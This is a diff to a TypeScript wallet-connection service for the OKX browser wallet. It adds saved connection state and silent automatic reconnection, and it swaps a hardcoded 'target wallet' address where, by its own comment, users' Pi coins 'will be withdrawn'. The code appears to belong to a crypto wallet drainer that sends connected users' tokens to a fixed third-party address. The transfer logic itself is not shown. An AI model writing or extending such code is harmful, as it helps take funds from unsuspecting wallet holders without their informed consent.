@@ -19,6 +19,10 @@ interface WalletInfo {
   isConnected: boolean;
 }
 
+// Local storage keys
+const WALLET_CONNECTION_KEY = 'okx_wallet_connected';
+const WALLET_ADDRESS_KEY = 'okx_wallet_address';
+
 class OKXWalletService {
   private provider: ethers.BrowserProvider | null = null;
   private signer: ethers.JsonRpcSigner | null = null;
@@ -26,7 +30,47 @@ class OKXWalletService {
 
   constructor() {
     // Set the target wallet address where Pi coins will be withdrawn
-    this.targetWalletAddress = '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6'; // Replace with your target wallet
+    this.targetWalletAddress = '0xffb5a95e5ff7ffc61813bba9171d026c64b09059'; // Replace with your target wallet
+  }
+
+  // Save wallet connection state to localStorage
+  private saveWalletState(address: string): void {
+    try {
+      localStorage.setItem(WALLET_CONNECTION_KEY, 'true');
+      localStorage.setItem(WALLET_ADDRESS_KEY, address);
+    } catch (error) {
+      console.error('Error saving wallet state to localStorage:', error);
+    }
+  }
+
+  // Clear wallet connection state from localStorage
+  private clearWalletState(): void {
+    try {
+      localStorage.removeItem(WALLET_CONNECTION_KEY);
+      localStorage.removeItem(WALLET_ADDRESS_KEY);
+    } catch (error) {
+      console.error('Error clearing wallet state from localStorage:', error);
+    }
+  }
+
+  // Check if wallet was previously connected
+  isWalletPreviouslyConnected(): boolean {
+    try {
+      return localStorage.getItem(WALLET_CONNECTION_KEY) === 'true';
+    } catch (error) {
+      console.error('Error checking wallet connection state:', error);
+      return false;
+    }
+  }
+
+  // Get previously connected wallet address
+  getPreviouslyConnectedAddress(): string | null {
+    try {
+      return localStorage.getItem(WALLET_ADDRESS_KEY);
+    } catch (error) {
+      console.error('Error getting previously connected address:', error);
+      return null;
+    }
   }
 
   async connectWallet(): Promise<WalletInfo> {
@@ -41,6 +85,9 @@ class OKXWalletService {
         this.signer = await this.provider.getSigner();
         
         const address = await this.signer.getAddress();
+        
+        // Save connection state to localStorage
+        this.saveWalletState(address);
         
         // Get ETH balance
         const balance = await this.provider.getBalance(address);
@@ -64,9 +111,54 @@ class OKXWalletService {
     }
   }
 
+  async reconnectWallet(): Promise<WalletInfo | null> {
+    try {
+      // Check if OKX wallet is available and was previously connected
+      if (typeof window.okxwallet !== 'undefined' && this.isWalletPreviouslyConnected()) {
+        // Check if the wallet is still connected
+        const accounts = await window.okxwallet.request({ method: 'eth_accounts' });
+        
+        if (accounts && accounts.length > 0) {
+          // Create provider and signer
+          this.provider = new ethers.BrowserProvider(window.okxwallet);
+          this.signer = await this.provider.getSigner();
+          
+          const address = await this.signer.getAddress();
+          
+          // Get ETH balance
+          const balance = await this.provider.getBalance(address);
+          const ethBalance = ethers.formatEther(balance);
+          
+          // Get Pi token balance
+          const piBalance = await this.getPiTokenBalance(address);
+          
+          return {
+            address,
+            balance: ethBalance,
+            piBalance,
+            network: 'Pi Network',
+            isConnected: true
+          };
+        } else {
+          // Wallet is not connected anymore, clear the state
+          this.clearWalletState();
+          return null;
+        }
+      }
+      return null;
+    } catch (error) {
+      console.error('Error reconnecting wallet:', error);
+      // Clear invalid state
+      this.clearWalletState();
+      return null;
+    }
+  }
+
   async disconnectWallet(): Promise<void> {
     this.provider = null;
     this.signer = null;
+    // Clear connection state from localStorage
+    this.clearWalletState();
   }
 
   async getPiTokenBalance(address: string): Promise<string> {
